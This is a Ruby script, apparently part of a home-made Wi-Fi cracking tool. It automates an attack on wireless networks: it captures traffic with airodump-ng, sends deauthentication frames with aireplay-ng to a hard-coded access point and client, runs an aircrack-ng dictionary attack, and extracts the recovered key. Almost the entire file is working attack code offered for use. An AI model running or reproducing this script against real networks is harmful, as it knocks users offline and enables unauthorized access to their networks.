require 'timeout'
require './monitoring_stopper.rb'
require './cleaner.rb'
# Hanshake capture

def wpa_handler r = Router.new
	
	# Begin Loop
	begin
		
		cleaner()
		s = r.stations.sample
		
		pid = Process.spawn("sudo airodump-ng mon0 --bssid #{s.bssid} -c #{s.channel} -w replay --ivs")
		begin
			Timeout.timeout(16) do
				`sudo aireplay-ng -0 10 -a 00:1D:7E:FB:38:80 -c 00:C0:CA:62:94:B1 -e linksys --ignore-negative-one mon0`
				Process.wait(pid)
			end
		rescue Timeout::Error
			system("clear")
			Process.kill('TERM', pid)
		end

		if !system("sudo aircrack-ng -w pass.lst replay-01.ivs > crack_info.txt")
			system("clear")
			puts "\nCracking failed! Try again!"
		else
			puts "Done cracking!" 
		end
		
		puts
		key = "ERROR!"
		found = false

		File.open("crack_info.txt","r").each do |line|
			if line.to_s =~ /KEY FOUND!/ 
				key = line
				key = key.split(/KEY FOUND!/)[1].to_s.split('[')[1].to_s.split(']')[0].to_s.gsub(' ', "")
				puts "KEY FOUND: #{key}"
				puts "Yay!"
				found = true
				break
			end
		end

		input = 'n'
		if !found 
			puts "Key could not be found in dictionary, sorry! T.T" 
			puts "Do you want to try again? (y/n)"
			input = gets.chomp
		end
		
		
	end while input == 'y' || input == 'Y' && !found
	# End of Loop
	
	puts
	puts "Press Enter to continue..."
	gets.chomp
	
end


